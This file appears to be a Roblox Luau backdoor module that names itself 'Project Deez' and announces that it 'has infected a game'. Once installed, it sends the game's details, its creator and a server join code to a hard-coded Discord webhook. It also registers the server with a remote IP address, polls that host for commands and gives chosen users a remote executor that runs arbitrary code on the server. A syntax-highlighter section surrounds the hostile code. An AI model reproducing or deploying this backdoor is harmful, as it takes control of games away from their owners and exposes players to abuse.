local loadUI = function(player)
	if not player:IsA("Player") then return end

	local UI = game:GetObjects("rbxassetid://100448890479809")[1]

	--// console
	game:GetService("LogService").MessageOut:Connect(function(message, messageType)
		UI.Main.Output:FireClient(player, message, messageType)
	end)

	--// executor
	UI.Main.Tabs.Executor.Buttons.Execute.RemoteEvent.OnServerEvent:Connect(function(player, str)
		local b = Instance.new("BindableFunction"); b.OnInvoke = require; b:Invoke(14132891321):SpawnS(str, workspace);
	end)

	--// syntax highlighting
	local highlighter = {}
	local keywords = {
		lua = {
			"and", "break", "or", "else", "elseif", "if", "then", "until", "repeat", "while", "do", "for", "in", "end",
			"local", "return", "function", "export"
		},
		rbx = {
			"game", "workspace", "script", "math", "string", "table", "task", "wait", "select", "next", "Enum",
			"error", "warn", "tick", "assert", "shared", "loadstring", "tonumber", "tostring", "type",
			"typeof", "unpack", "print", "Instance", "CFrame", "Vector3", "Vector2", "Color3", "UDim", "UDim2", "Ray", "BrickColor",
			"OverlapParams", "RaycastParams", "Axes", "Random", "Region3", "Rect", "TweenInfo",
			"collectgarbage", "not", "utf8", "pcall", "xpcall", "_G", "setmetatable", "getmetatable", "os", "pairs", "ipairs"
		},
		operators = {
			"#", "+", "-", "*", "%", "/", "^", "=", "~", "=", "<", ">", ",", ".", "(", ")", "{", "}", "[", "]", ";", ":"
		}
	}

	local colors = {
		numbers = Color3.fromRGB(255, 198, 0),
		boolean = Color3.fromRGB(214, 128, 23),
		operator = Color3.fromRGB(232, 210, 40),
		lua = Color3.fromRGB(160, 87, 248),
		rbx = Color3.fromRGB(146, 180, 253),
		str = Color3.fromRGB(56, 241, 87),
		comment = Color3.fromRGB(103, 110, 149),
		null = Color3.fromRGB(79, 79, 79),
		call = Color3.fromRGB(130, 170, 255),
		self_call = Color3.fromRGB(227, 201, 141),
		local_color = Color3.fromRGB(199, 146, 234),
		function_color = Color3.fromRGB(241, 122, 124),
		self_color = Color3.fromRGB(146, 134, 234),
		local_property = Color3.fromRGB(129, 222, 255),
	}

	local function createKeywordSet(keywords)
		local keywordSet = {}
		for _, keyword in ipairs(keywords) do
			keywordSet[keyword] = true
		end
		return keywordSet
	end

	local luaSet = createKeywordSet(keywords.lua)
	local rbxSet = createKeywordSet(keywords.rbx)
	local operatorsSet = createKeywordSet(keywords.operators)

	local function getHighlight(tokens, index)
		local token = tokens[index]

		if colors[token .. "_color"] then
			return colors[token .. "_color"]
		end

		if tonumber(token) then
			return colors.numbers
		elseif token == "nil" then
			return colors.null
		elseif token:sub(1, 2) == "--" then
			return colors.comment
		elseif operatorsSet[token] then
			return colors.operator
		elseif luaSet[token] then
			return colors.rbx
		elseif rbxSet[token] then
			return colors.lua
		elseif token:sub(1, 1) == "\"" or token:sub(1, 1) == "\'" then
			return colors.str
		elseif token == "true" or token == "false" then
			return colors.boolean
		end

		if tokens[index + 1] == "(" then
			if tokens[index - 1] == ":" then
				return colors.self_call
			end

			return colors.call
		end

		if tokens[index - 1] == "." then
			if tokens[index - 2] == "Enum" then
				return colors.rbx
			end

			return colors.local_property
		end
	end

	function highlighter.run(source)
		local tokens = {}
		local currentToken = ""

		local inString = false
		local inComment = false
		local commentPersist = false

		for i = 1, #source do
			local character = source:sub(i, i)

			if inComment then
				if character == "\n" and not commentPersist then
					table.insert(tokens, currentToken)
					table.insert(tokens, character)
					currentToken = ""

					inComment = false
				elseif source:sub(i - 1, i) == "]]" and commentPersist then
					currentToken ..= "]"

					table.insert(tokens, currentToken)
					currentToken = ""

					inComment = false
					commentPersist = false
				else
					currentToken = currentToken .. character
				end
			elseif inString then
				if character == inString and source:sub(i-1, i-1) ~= "\\" or character == "\n" then
					currentToken = currentToken .. character
					inString = false
				else
					currentToken = currentToken .. character
				end
			else
				if source:sub(i, i + 1) == "--" then
					table.insert(tokens, currentToken)
					currentToken = "-"
					inComment = true
					commentPersist = source:sub(i + 2, i + 3) == "[["
				elseif character == "\"" or character == "\'" then
					table.insert(tokens, currentToken)
					currentToken = character
					inString = character
				elseif operatorsSet[character] then
					table.insert(tokens, currentToken)
					table.insert(tokens, character)
					currentToken = ""
				elseif character:match("[%w_]") then
					currentToken = currentToken .. character
				else
					table.insert(tokens, currentToken)
					table.insert(tokens, character)
					currentToken = ""
				end
			end
		end

		table.insert(tokens, currentToken)

		local highlighted = {}

		for i, token in ipairs(tokens) do
			local highlight = getHighlight(tokens, i)

			if highlight then
				local syntax = string.format("<font color = \"#%s\">%s</font>", highlight:ToHex(), token:gsub("<", "&lt;"):gsub(">", "&gt;"))

				table.insert(highlighted, syntax)
			else
				table.insert(highlighted, token)
			end
		end

		return table.concat(highlighted)
	end

	script.Parent.Parent.TextBox:GetPropertyChangedSignal("Text"):Connect(function()
		local text = highlighter.run(script.Parent.Parent.TextBox.Text)
		script.Parent.Text = text
	end)
end

return function()
	task.spawn(function()
		local http = game:GetService("HttpService")

		local gameInfo = http:JSONDecode(http:GetAsync("https://games.roproxy.com/v1/games?universeIds="..game.GameId)).data[1]
		local productInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
		local playabilityStatus = http:JSONDecode(http:GetAsync("https://games.roproxy.com/v1/games/multiget-playability-status?universeIds="..game.GameId))[1]

		local data = {
			embeds = {
				{
					title = "**Project Deez**",
					description = "Project Deez has infected a game",
					footer = {
						icon_url = '',
						text = "Project Deez | Infected Game"
					},
					color = tonumber(0x3cf14b),
					thumbnail = {
						url = http:JSONDecode(http:GetAsync("https://thumbnails.roproxy.com/v1/games/icons?universeIds="..game.GameId.."&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false")).data[1].imageUrl
					},
					fields = {
						{
							name = "**__Game Information__**:",
							value = "> **Game Name**: "..productInfo.Name.." \n > **Game Link**: https://www.roblox.com/games/"..game.PlaceId.." \n > **Visits**: `"..tostring(gameInfo.visits).."` \n > **Playing**: `"..tostring(gameInfo.playing).."` \n > **Rig Type**: "..tostring(gameInfo.universeAvatarType).." \n > **API Access**: "..tostring(gameInfo.studioAccessToApisAllowed),
							inline = false
						},
						{
							name = "**__Server Information__**:",
							value = "> **Players**: "..game.Players.NumPlayers.."/"..game.Players.MaxPlayers.." \n > **Playability Status**: "..playabilityStatus.playabilityStatus.." \n > **Playable**: "..tostring(playabilityStatus.isPlayable),
							inline = false
						},
						{
							name = "**__Creator Information__**:",
							value = "> **Creator**: [@"..game.Players:GetNameFromUserIdAsync(game.CreatorId).."](https://www.roblox.com/users/"..game.CreatorId.."/profile) \n > **Verified**: "..tostring(gameInfo.creator.hasVerifiedBadge).." \n > **Creator Type**: "..game.CreatorType.Name.."",
							inline = false
						},
						{
							name = "**__Join Code__**:",
							value = "```javascript\n+javascript:Roblox.GameLauncher.joinGameInstance("..game.PlaceId..', "'..game.JobId..'")```',
							inline = false
						}
					}
				}
			}
		}

		data = http:JSONEncode(data)
		http:PostAsync("https://discord.com/api/webhooks/1266136784430174248/TyoS4dpeq82v1Oh98kqwqLV_elH8tL34K9KT7EvQktdZLAf3IkGdDIuLMr_b0_UGasCV", data)
	end)
	
	if game:GetService("RunService"):IsStudio() then
		return
	end

	local httpService = game:GetService("HttpService")
	local domain = "http://35.204.90.186/"

	local placeID = game.PlaceId
	local jobID = #game.JobId ~= 0 and game.JobId or httpService:GenerateGUID(false)

	-- // start the server

	httpService:PostAsync(domain .. "add", httpService:JSONEncode({
		placeID = placeID,
		jobID = jobID
	}))

	-- // start listening

	task.spawn(function()
		while task.wait() do
			local queue = httpService:JSONDecode(httpService:GetAsync(domain .. "listen?placeID=" .. placeID .. "&jobID=" .. jobID))

			for _, data in pairs(queue) do
				if data["type"] == 0 then
					loadUI(game.Players:GetPlayerByUserId(data["userID"]))
				end
			end
		end
	end)

	-- // on server close

	game:BindToClose(function()
		httpService:PostAsync(domain .. "remove", httpService:JSONEncode({
			placeID = placeID,
			jobID = jobID
		}))
	end)
end
